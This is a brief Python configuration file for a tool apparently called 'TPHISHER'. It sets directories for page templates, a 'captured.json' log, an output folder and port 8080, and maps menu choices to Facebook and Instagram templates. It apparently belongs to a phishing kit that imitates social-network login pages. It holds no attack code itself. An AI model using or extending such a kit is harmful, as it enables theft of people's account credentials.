import os

class Config:
    VERSION = "2.0"
    NAME = "TPHISHER"
    BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    TEMPLATE_DIR = os.path.join(BASE, "templates")
    LOG_DIR = os.path.join(BASE, "logs")
    LOG_FILE = os.path.join(LOG_DIR, "captured.json")
    OUTPUT_DIR = os.path.join(BASE, "output")
    PORT = 8080

    TEMPLATES = {
        "1": ("facebook", "Facebook"),
        "2": ("instagram", "Instagram"),
    }
